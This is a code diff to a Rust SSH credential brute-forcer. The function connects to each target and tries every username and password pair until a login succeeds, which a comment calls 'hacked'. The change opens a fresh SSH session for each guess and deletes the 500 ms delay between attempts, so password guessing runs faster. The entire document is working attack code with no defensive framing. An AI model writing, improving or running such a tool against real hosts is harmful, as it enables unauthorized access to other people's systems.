@@ -1,17 +1,17 @@
 use std::net::TcpStream;
 use ssh2::Session;
-use std::{thread, time};
 
 pub fn ssh(target: Vec<String>, usernames: &'static [&'static str], passwords: &'static [&'static str]) {
     for target in target {
-        let tcp = TcpStream::connect(&target).unwrap();
-        let mut sess = Session::new().unwrap();
-        sess.set_tcp_stream(tcp);
-        sess.handshake().unwrap();
 
         'brutessh: for user in usernames {
             // for every combination of username and password, try and ssh
             for pass in passwords {
+                let tcp = TcpStream::connect(&target).unwrap();
+                let mut sess = Session::new().unwrap();
+                sess.set_tcp_stream(tcp);
+                sess.handshake().unwrap();
+
                 let did_it_work = sess.userauth_password(&user, &pass);
 
                 match did_it_work { //if ssh returns OK(), then it is hacked, otherwise, it isn't
@@ -21,7 +21,6 @@ pub fn ssh(target: Vec<String>, usernames: &'static [&'static str], passwords: &
                         break 'brutessh;
                     },
                 }
-                thread::sleep(time::Duration::from_millis(500));
             }
         }
     }
